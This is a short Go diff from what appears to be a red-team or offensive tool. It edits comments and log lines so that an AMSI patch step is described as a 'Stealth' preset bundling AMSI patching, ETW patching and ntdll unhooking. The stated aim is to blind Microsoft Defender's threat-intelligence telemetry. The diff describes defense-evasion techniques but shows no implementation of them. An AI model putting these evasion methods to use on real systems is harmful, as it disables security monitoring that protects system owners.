@@ -87,15 +87,16 @@ func main() {
 	logStep("running as: %s", currentUser())
 	logStep("probe payload: %d bytes", len(probeBytes))
 
-	// Defence in depth: patch AMSI in this process via our own
-	// evasion/amsi package so any in-process AMSI client (e.g. an
-	// embedded scripting host we might add later) is short-circuited
-	// to AMSI_RESULT_CLEAN. Scope is per-process; spawned PowerShell
-	// children get a fresh amsi.dll.
+	// Defence in depth: apply evasion/preset.Stealth() which bundles
+	// AMSI patch + ETW patch + selective ntdll unhook. ETW is the
+	// important one for SYSTEM-context scenarios -- Defender's
+	// behavioural analysis subscribes to Microsoft-Windows-Threat-
+	// Intelligence ETW events; blinding that channel removes the
+	// telemetry that previously RC=1'd us silently AS lowuser.
 	if err := patchAMSI(); err != nil {
-		logStep("amsi.PatchAll failed (continuing without AMSI bypass): %v", err)
+		logStep("evasion.preset.Stealth failed (continuing): %v", err)
 	} else {
-		logStep("amsi.PatchAll: AmsiScanBuffer + AmsiOpenSession neutered in this process")
+		logStep("evasion.preset.Stealth applied: AMSI + ETW + ntdll unhook")
 	}
 
 	// Live discovery via recon/dllhijack — eat our own dog food.
